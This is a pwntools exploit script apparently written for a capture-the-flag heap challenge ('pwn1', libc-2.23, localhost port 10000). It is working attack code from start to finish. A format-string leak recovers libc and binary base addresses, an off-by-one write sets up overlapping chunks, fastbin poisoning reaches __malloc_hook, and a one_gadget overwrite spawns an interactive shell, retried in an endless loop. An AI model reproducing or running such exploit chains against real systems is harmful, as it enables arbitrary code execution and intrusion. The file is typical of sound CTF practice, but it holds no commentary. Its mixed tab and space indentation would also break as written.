from pwn import *

#context.log_level="debug"
DEBUG=0
EXEC_FILE = "./pwn1"
REMOTE_LIBC = "./libc-2.23.so"

def main():
    if DEBUG:
        r = process(EXEC_FILE)
        elf = ELF(EXEC_FILE)
        libc = elf.libc
        main_arena_offset = 0x3c4b20
	one_gadget = 0xf02a4
	libc_start_main_offset = 0xf0
    else:
        r = remote("127.0.0.1",10000) # libc-2.23
        elf = ELF(EXEC_FILE)
        libc = ELF(REMOTE_LIBC)
	main_arena_offset = 0x3c4b20
	one_gadget = 0xf02a4
	libc_start_main_offset = 0xf0

    def menu(idx):
        sleep(0.1)
        r.recv()
	sleep(0.1)
        r.sendline(str(idx))

    def add(idx,size,content):
        menu(1)
        r.recv()
        r.sendline(str(idx))
        r.recv()
        r.sendline(str(size))
        r.recv()
        r.sendline(str(content))

    def delete(idx):
        menu(2)
        r.recv()
        r.sendline(str(idx))


    def edit(idx,content):
        menu(4)
        r.recv()
        r.sendline(str(idx))
        r.recv()
        r.sendline(str(content))

    r.recv()

    r.sendline("%15$lx%11$lx")


    r.recvuntil("Hello, ")
    libc_addr = eval("0x"+r.recv(2*6)) - libc_start_main_offset - libc.symbols['__libc_start_main']

    success(hex(libc_addr))
    base_addr = eval("0x"+r.recv(2*6)) - 28 - 0x116a

    success(hex(base_addr))
    add(0,0x88,'a')
    add(1,0x88,'a')
    add(2,0x88,'a')
    add(3,0x88,'a')
    add(4,0x88,'a')
    add(5,0x88,'a')



    delete(0)
    edit(3,'a'*0x80+p64(0x240)+p8(0x90))

    delete(4)

    add(0,0x88,'a')
    add(4,0x88,'a')
    add(6,0x88,'a')

    edit(0,'a'*0x88+p8(0x71))
    edit(1,'a'*0x60+p64(0)+p64(0x21)+'a'*0x18+p64(0x71))
    edit(2,'a'*0x60+p64(0)+p8(0x21))
    #pause()
    edit(3,p64(0)+p64(base_addr+0x20202f))

    delete(1)	# fastbins
    delete(2)
    #pause()
    add(1,0x110,'a')
    #pause()
    edit(6,p64(libc_addr + main_arena_offset - 0x20 - 3))

    r.sendlineafter(">> ",'1')
    r.sendlineafter(":",'2')
    
    sleep(0.1)
    r.sendlineafter(":\n",str(0x68))	# malloc_hook
    #pause()
    if "hack" in r.recvline():
        return

    r.sendline("H4lo")
    
    #pause()
    payload = 'a'*0x3 + p64(libc_addr + one_gadget)	# one_gadget
    add(8,0x68,payload)

    add(9,0x68,"H4lo")

    r.interactive()

if __name__ == '__main__':
    while(True):
	main()
